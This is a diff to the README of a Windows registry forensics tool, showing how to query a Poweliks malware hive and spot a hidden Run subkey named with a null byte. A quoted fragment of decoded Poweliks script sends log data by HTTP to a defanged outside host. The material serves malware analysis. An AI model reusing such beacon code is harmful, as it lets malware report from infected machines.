@@ -205,6 +205,41 @@ Windows Registry Editor Version 5.00
 "ctfmon.exe"="C:\WINDOWS\system32\ctfmon.exe"    
 </pre>
 
+####Get information about a registry key:
+
+<pre>
+-s "examples/poweliks.dat" -p "parser -ki Software\Microsoft\Windows\CurrentVersion\Run"
+</pre>
+Result:
+<pre>
+Mapping: HKEY_CURRENT_USER
+Root Key: Software\Microsoft\Windows\CurrentVersion\Run
+Hive: examples/poweliks.dat
+Hive type: NTUSER
+Subkeys: 
+ [*] Software\Microsoft\Windows\CurrentVersion\Run:
+     [+]  
+</pre>
+
+Let's use again format fields to get some more details:
+<pre>
+-s "examples/poweliks.dat" -ff "key_subkey_count,key_value_count,key_path,key_path_unicode" -f tab -p "parser -qkw Software\Microsoft\Windows\CurrentVersion\Run\*"
+</pre>
+Result:
+<pre>
+1  4  Software\Microsoft\Windows\CurrentVersion\Run      	        b'[...]\x00\\\x00R\x00u\x00n\x00'                                
+1  4  Software\Microsoft\Windows\CurrentVersion\Run      	        b'[...]\x00\\\x00R\x00u\x00n\x00'                                
+1  4  Software\Microsoft\Windows\CurrentVersion\Run                 b'[...]\x00\\\x00R\x00u\x00n\x00'                                
+1  4  Software\Microsoft\Windows\CurrentVersion\Run                 b'[...]\x00\\\x00R\x00u\x00n\x00'                                
+0  0  Software\Microsoft\Windows\CurrentVersion\Run\\x00\x01\x01    b'[...]\x00\\\x00R\x00u\x00n\x00\\\x00\x01\x00\x00\x00\x01\x00'
+
+--> First 4 entries from the same key, claim that there are 4 values (which is indeed True) and that there is 1 subkey ...
+  ---> The subkey is hidden, since its name starts with a null byte and is followed by non-printable characters 
+    ----> In hidden subkeys there are 0 subkeys and 0 values (So empty hidden key)  
+
+--> -qkw: allows for wildcard querying, so i was able to make \Run\* to indicate to scan the \Run and its subkeys
+</pre>
+
 ####Query registry value:
 Let's say you want to query default registry value in the Run key, and get its value_name and value_content only.
 <pre>
@@ -268,7 +303,7 @@ cat /tmp/script.vbe | head -c 120
 function log(l){try{x=new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","hxxp://faebd7[.]com/log?log="+l,false);x
 </pre>
 
-*Executing Plugins:*
+#### Executing Plugins:
 
 <pre>
 -s "examples/poweliks.dat" -p "plugin_name < plugin_params >,plugin_name < plugin_params >"
@@ -279,45 +314,6 @@ Following command would execute all specified plugins against all loaded hives:
 -p "autoruns,office"
 </pre>
 
-Following code example covers the usage of "parser" plugin.
-
-Get information about loaded registry hives:
-
-<pre>
-Option:  --hive-info, -hi
-</pre>
-
-Get information about a registry key:
-
-<pre>
-Option:  --key-info, -ki
-Param:   --key-info "key_string"
-
-Example: 
-         --key-info "Microsoft\Windows\CurrentVersion"
-</pre>
-
-Query registry key(s): 
-
-<pre>
-Option:  --query-key, -qk
-Param:   --query-key "key_string"
-         --query-key "key_string1","key_string2","key_stringN"
-
-Example: 
-         --query-key "Microsoft\Windows\CurrentVersion\Run","Software\Microsoft\Windows\CurrentVersion\Run"
-</pre>
-
-Query registry value(s): 
-
-<pre>
-Option:  --query-value, -qv
-Param:   --query-value "key_string"
-         --query-value "value_path_string1","value_path_string2","..."
-
-Example: 
-         --query-key "Microsoft\Windows\CurrentVersion\Run\ValueName","Software\Microsoft\Windows\CurrentVersion\Run\ValueName2"
-</pre>
 
 **Baseline:**
 
